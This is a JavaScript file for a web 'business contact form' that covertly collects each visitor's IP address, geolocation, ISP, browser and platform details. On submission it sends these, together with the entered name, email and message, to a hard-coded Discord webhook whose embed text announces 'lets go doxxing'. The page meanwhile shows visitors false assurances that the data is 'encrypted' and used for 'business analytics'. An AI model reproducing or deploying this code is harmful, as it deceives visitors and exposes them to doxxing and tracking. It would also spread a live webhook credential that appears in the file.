// Discord Webhook URL
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444318939751518369/-9blXMbgbRx-r-Frr6OgENLAhgB_H3Vg6LV37u6qejKaFRcjSKOgqd5l5TYaHM_QQzGr";

// User data storage
let userData = {
  ip: '',
  location: {},
  timestamp: '',
  userAgent: '',
  referrer: document.referrer || 'Direct'
};

// Notifications
const notifications = {
  ipDetected: "IP address detected and logged for business analytics.",
  formReady: "Form ready for business inquiry submission.",
  securityActive: "Security protocols active - all data encrypted.",
  highPriority: "Business inquiries receive priority response.",
  submissionReceived: "Your business inquiry has been received and is being processed."
};

// DOM Elements
const form = document.getElementById('contactForm');
const statusMessage = document.getElementById('statusMessage');
const notifySection = document.getElementById('notifySection');
const notifyContent = document.getElementById('notifyContent');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const btnSpinner = document.getElementById('btnSpinner');
const charCounter = document.getElementById('charCounter');
const messageInput = document.getElementById('message');

// Rate Limiter for business use
class RateLimiter {
    constructor(limit, interval) {
        this.limit = limit;
        this.interval = interval;
        this.attempts = [];
    }

    canProceed() {
        const now = Date.now();
        this.attempts = this.attempts.filter(time => now - time < this.interval);
        
        if (this.attempts.length < this.limit) {
            this.attempts.push(now);
            return true;
        }
        return false;
    }

    getTimeToWait() {
        if (this.attempts.length === 0) return 0;
        const oldest = this.attempts[0];
        const now = Date.now();
        return Math.ceil((this.interval - (now - oldest)) / 1000);
    }
}

const rateLimiter = new RateLimiter(5, 10 * 60 * 1000); // 5 attempts per 10 minutes

// Show notification
function showNotification(message, duration = 5000) {
    notifyContent.textContent = message;
    notifySection.classList.add('active');
    
    if (duration > 0) {
        setTimeout(() => {
            notifySection.classList.remove('active');
        }, duration);
    }
}

// Show status message
function showStatus(text, type = 'info') {
    statusMessage.textContent = text;
    statusMessage.className = `status-message ${type}`;
}

// Hide status message
function hideStatus() {
    statusMessage.style.display = 'none';
}

// Fetch IP and location data
async function fetchIPData() {
    try {
        // Get IP
        const ipResponse = await fetch("https://api.ipify.org/?format=json");
        const ipData = await ipResponse.json();
        userData.ip = ipData.ip;
        
        // Get location from IP
        try {
            const locationResponse = await fetch(`http://ip-api.com/json/${userData.ip}`);
            const locationData = await locationResponse.json();
            userData.location = locationData;
        } catch (e) {
            console.log("Could not fetch location data");
        }
        
        // Get timestamp
        userData.timestamp = new Date().toISOString();
        userData.userAgent = navigator.userAgent;
        
        // Show notification
        showNotification(notifications.ipDetected, 3000);
        console.log("Business analytics data collected");
        
    } catch (error) {
        console.error("Error fetching IP data:", error);
        userData.ip = 'Unknown';
    }
}

// Validate form for business use
function validateBusinessForm(name, email, message) {
    const errors = [];
    
    if (!name || name.trim().length < 2) {
        errors.push("Please provide a valid name");
        document.getElementById('name').classList.add('error');
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
        errors.push("Please provide a valid business email");
        document.getElementById('email').classList.add('error');
    }
    
    if (!message || message.trim().length < 20) {
        errors.push("Please provide a detailed business inquiry (min 20 chars)");
        document.getElementById('message').classList.add('error');
    }
    
    return errors;
}

// Format business Discord message with all data
function formatBusinessDiscordMessage(name, email, business, category, message) {
    const now = new Date();
    const timestamp = now.toLocaleString('en-US', {
        weekday: 'short',
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZoneName: 'short'
    });

    // Create rich Discord embed for business
    return {
        content: "new message wohoo lets go doxxing",
        embeds: [{
            title: "results",
            color: 0x2cff6a,
            thumbnail: {
                url: "https://cdn.discordapp.com/embed/avatars/0.png"
            },
            fields: [
                {
                    name: "INFORMATION",
                    value: `**Name:** ${name}\n**Email:** ${email}\n**Business:** ${business || 'Not provided'}\n**Category:** ${category || 'Not specified'}`,
                    inline: false
                },
                {
                    name: "MESSAGE CONTENT",
                    value: message.length > 1000 ? message.substring(0, 1000) + '...' : message,
                    inline: false
                },
                {
                    name: "ANALYTICS DATA",
                    value: `**IP Address:** ${userData.ip}\n**Location:** ${userData.location.country || 'Unknown'}, ${userData.location.city || 'Unknown'}\n**ISP:** ${userData.location.isp || 'Unknown'}\n**Referrer:** ${userData.referrer}`,
                    inline: false
                },
                {
                    name: "SYSTEM INFORMATION",
                    value: `**User Agent:** ${navigator.userAgent.substring(0, 50)}...\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}`,
                    inline: false
                },
                {
                    name: "TIMESTAMP & PRIORITY",
                    value: `**Received:** ${timestamp}\n**Priority:** ${category === 'partnership' || category === 'sales' ? 'high priority' : 'Standard'}\n**Status:** awaiting response`,
                    inline: false
                }
            ],
            footer: {
                text: "eheh dont worrey safe for us"
            },
            timestamp: now.toISOString()
        }]
    };
}

// Send notification to Discord
async function sendDiscordNotification(name, email, business, category, message) {
    try {
        const discordMessage = formatBusinessDiscordMessage(name, email, business, category, message);
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage)
        });
        
        if (!response.ok) {
            throw new Error(`Discord API error: ${response.status}`);
        }
        
        return true;
    } catch (error) {
        console.error("Discord notification error:", error);
        throw error;
    }
}

// Handle business form submission
async function handleBusinessSubmit(e) {
    e.preventDefault();
    
    // Get form values
    const name = document.getElementById('name').value.trim();
    const email = document.getElementById('email').value.trim();
    const business = document.getElementById('business').value.trim();
    const category = document.getElementById('category').value;
    const message = document.getElementById('message').value.trim();
    const honeypot = document.getElementById('website').value;
    
    // Honeypot check
    if (honeypot) {
        console.log('Bot detected - business form');
        showStatus('Thank you for your inquiry.', 'success');
        form.reset();
        charCounter.textContent = '0/2000';
        return;
    }
    
    // Validate business form
    const errors = validateBusinessForm(name, email, message);
    if (errors.length > 0) {
        showStatus(errors.join('\n'), 'error');
        return;
    }
    
    // Check rate limiting
    if (!rateLimiter.canProceed()) {
        const waitTime = rateLimiter.getTimeToWait();
        showStatus(`Too many submissions. Please wait ${waitTime} seconds.`, 'error');
        showNotification("Rate limit exceeded. Please wait before submitting another business inquiry.");
        return;
    }
    
    // Update UI for sending
    submitBtn.disabled = true;
    btnText.textContent = 'PROCESSING...';
    btnSpinner.style.display = 'inline-block';
    showNotification("Processing business inquiry with analytics...");
    showStatus('Processing your business inquiry...', 'info');
    
    try {
        // Send to Discord with all analytics
        await sendDiscordNotification(name, email, business, category, message);
        
        // Success
        showStatus('BUSINESS INQUIRY RECEIVED! We will contact you shortly.', 'success');
        showNotification(notifications.submissionReceived, 5000);
        
        // Log for business analytics
        console.log("Business inquiry submitted:", {
            name,
            email,
            business,
            category,
            ip: userData.ip,
            timestamp: new Date().toISOString()
        });
        
        // Reset form
        form.reset();
        charCounter.textContent = '0/2000';
        
        // Reset button after delay
        setTimeout(() => {
            btnText.textContent = 'SEND BUSINESS INQUIRY';
            btnSpinner.style.display = 'none';
            submitBtn.disabled = false;
        }, 3000);
        
    } catch (error) {
        console.error('Business submission error:', error);
        
        // Error
        showStatus('Submission failed. Please try again or contact support.', 'error');
        showNotification("Submission failed. Please check your connection and try again.");
        
        // Reset button
        btnText.textContent = 'RETRY SUBMISSION';
        btnSpinner.style.display = 'none';
        submitBtn.disabled = false;
    }
}

// Initialize business contact system
document.addEventListener('DOMContentLoaded', function() {
    // Fetch IP and analytics data
    fetchIPData();
    
    // Show initial notifications
    setTimeout(() => {
        showNotification(notifications.formReady, 3000);
    }, 1000);
    
    setTimeout(() => {
        showNotification(notifications.securityActive, 3000);
    }, 4000);
    
    // Character counter
    messageInput.addEventListener('input', () => {
        const length = messageInput.value.length;
        charCounter.textContent = `${length}/2000`;
    });
    
    // Clear errors on input
    form.querySelectorAll('input, textarea').forEach(input => {
        input.addEventListener('input', () => {
            input.classList.remove('error');
            hideStatus();
        });
    });
    
    // Form submission
    form.addEventListener('submit', handleBusinessSubmit);
    
    // Focus on name field
    document.getElementById('name').focus();
    
    console.log('thOSp Business Contact System initialized');
    console.log('Analytics tracking active');
});
